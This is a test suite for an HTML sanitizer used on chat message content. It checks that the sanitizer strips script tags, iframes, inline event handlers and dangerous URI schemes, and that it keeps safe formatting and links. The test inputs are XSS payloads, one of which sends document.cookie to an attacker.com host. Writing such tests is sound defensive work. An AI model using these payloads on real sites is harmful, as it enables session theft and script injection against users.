import { describe, it } from 'node:test';
import * as assert from 'node:assert';
import { sanitizeMessageContent } from '../utils/html-sanitizer';

describe('HTML Sanitization for Message Content (Task 10 — Feature F-1.11.4)', () => {
  describe('XSS Prevention: Dangerous Tags Stripping', () => {
    it('should strip <script> tags and embedded code', () => {
      const input = '<script>alert("xss")</script>Hello World!';
      const result = sanitizeMessageContent(input);
      assert.strictEqual(result, 'Hello World!');
    });

    it('should strip external <script src="..."> tags', () => {
      const input = '<p>Message with script</p><script src="https://evil.com/hack.js"></script>';
      const result = sanitizeMessageContent(input);
      assert.strictEqual(result, '<p>Message with script</p>');
    });

    it('should strip <iframe>, <object>, <embed>, <svg>, <form>, <math>', () => {
      const input =
        '<div><iframe src="https://evil.com"></iframe><object data="bad.swf"></object><svg onload="alert(1)"></svg><form action="/login"><input type="text"/></form>Safe Text</div>';
      const result = sanitizeMessageContent(input);
      assert.strictEqual(result, '<div>Safe Text</div>');
    });
  });

  describe('XSS Prevention: Event Handler Stripping', () => {
    it('should remove inline onclick, onmouseover, onload, onerror handlers', () => {
      const input =
        '<b onclick="alert(1)" onmouseover="stealCookies()">Bold</b> <p onload="evil()">Text</p>';
      const result = sanitizeMessageContent(input);
      assert.strictEqual(result, '<b>Bold</b> <p>Text</p>');
    });

    it('should remove onerror from <img> tags while preserving safe src and alt', () => {
      const input =
        '<img src="https://cdn.example.com/avatar.png" alt="Avatar" onerror="alert(document.cookie)" />';
      const result = sanitizeMessageContent(input);
      assert.ok(!result.includes('onerror'));
      assert.ok(!result.includes('alert'));
      assert.ok(result.includes('src="https://cdn.example.com/avatar.png"'));
      assert.ok(result.includes('alt="Avatar"'));
    });
  });

  describe('XSS Prevention: Dangerous URI Schemes', () => {
    it('should remove javascript: pseudo-protocol from links', () => {
      const input = '<a href="javascript:alert(\'xss\')">Click Here</a>';
      const result = sanitizeMessageContent(input);
      assert.ok(!result.includes('javascript:'));
      assert.ok(!result.includes('href="javascript:'));
      assert.ok(result.includes('Click Here'));
    });

    it('should remove data: and vbscript: URIs from links', () => {
      const input =
        '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Data Link</a> <a href="vbscript:msgbox(1)">VBScript Link</a>';
      const result = sanitizeMessageContent(input);
      assert.ok(!result.includes('data:text/html'));
      assert.ok(!result.includes('vbscript:'));
      assert.ok(result.includes('Data Link'));
      assert.ok(result.includes('VBScript Link'));
    });
  });

  describe('Safe HTML Formatting Preservation', () => {
    it('should preserve standard rich text formatting tags', () => {
      const input =
        '<p>Hello <b>bold</b>, <strong>strong</strong>, <i>italic</i>, <em>emphasis</em>, <u>underline</u>, <s>strikethrough</s>, <code>code block</code></p>';
      const result = sanitizeMessageContent(input);
      assert.strictEqual(result, input);
    });

    it('should preserve lists, blockquotes, and headings', () => {
      const input =
        '<h3>Notes:</h3><blockquote>Important quote</blockquote><ul><li>Item 1</li><li>Item 2</li></ul>';
      const result = sanitizeMessageContent(input);
      assert.strictEqual(result, input);
    });

    it('should preserve safe links and add rel="noopener noreferrer" on target="_blank"', () => {
      const input = '<a href="https://salescopilot.vn" target="_blank">Sales Copilot</a>';
      const result = sanitizeMessageContent(input);
      assert.ok(result.includes('href="https://salescopilot.vn"'));
      assert.ok(result.includes('target="_blank"'));
      assert.ok(result.includes('rel="noopener noreferrer"'));
    });

    it('should preserve mailto: and tel: links', () => {
      const input =
        '<a href="mailto:support@salescopilot.vn">Email</a> and <a href="tel:+84987654321">Call</a>';
      const result = sanitizeMessageContent(input);
      assert.ok(result.includes('href="mailto:support@salescopilot.vn"'));
      assert.ok(result.includes('href="tel:+84987654321"'));
    });
  });

  describe('Edge Cases & Resiliency', () => {
    it('should return empty string for null, undefined, or empty string', () => {
      assert.strictEqual(sanitizeMessageContent(null), '');
      assert.strictEqual(sanitizeMessageContent(undefined), '');
      assert.strictEqual(sanitizeMessageContent(''), '');
    });

    it('should preserve standard plain text messages intact', () => {
      const plainText = 'Hello! I would like to inquire about the enterprise pricing plans.';
      assert.strictEqual(sanitizeMessageContent(plainText), plainText);
    });

    it('should result in empty string when content is exclusively malicious script', () => {
      const input =
        '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>';
      const result = sanitizeMessageContent(input);
      assert.strictEqual(result.trim(), '');
    });
  });
});
